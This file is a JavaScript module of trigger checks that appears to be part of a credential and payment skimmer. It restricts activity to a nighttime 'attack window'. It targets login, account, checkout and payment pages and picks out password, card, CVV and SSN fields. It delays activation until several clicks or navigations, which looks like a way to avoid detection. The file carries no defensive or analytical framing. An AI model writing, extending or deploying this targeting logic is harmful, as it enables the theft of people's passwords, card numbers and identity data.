// triggers.js - Trigger condition checkers

// Check if current time is within attack window
export function isTimeWindowActive() {
  const hour = new Date().getHours();
  // Active between 23:00 and 06:00 (nighttime)
  return hour >= 23 || hour <= 6;
}

// Check if URL matches target patterns
export function isTargetUrl(url) {
  const targets = [
    /login/i,
    /signin/i,
    /account/i,
    /checkout/i,
    /payment/i
  ];
  return targets.some(pattern => pattern.test(url));
}

// Check if element matches sensitive patterns
export function isSensitiveElement(element) {
  const type = element.type?.toLowerCase();
  const name = element.name?.toLowerCase() || '';
  const id = element.id?.toLowerCase() || '';

  const sensitivePatterns = [
    'password', 'pass', 'pwd',
    'credit', 'card', 'cvv',
    'ssn', 'social'
  ];

  return type === 'password' ||
         sensitivePatterns.some(p => name.includes(p) || id.includes(p));
}

// Check click count threshold
let clickCount = 0;
export function shouldActivateOnClick() {
  clickCount++;
  return clickCount >= 5;  // Activate after 5 clicks
}

// Check navigation count
let navCount = 0;
export function shouldActivateOnNav() {
  navCount++;
  return navCount >= 3;  // Activate after 3 navigations
}
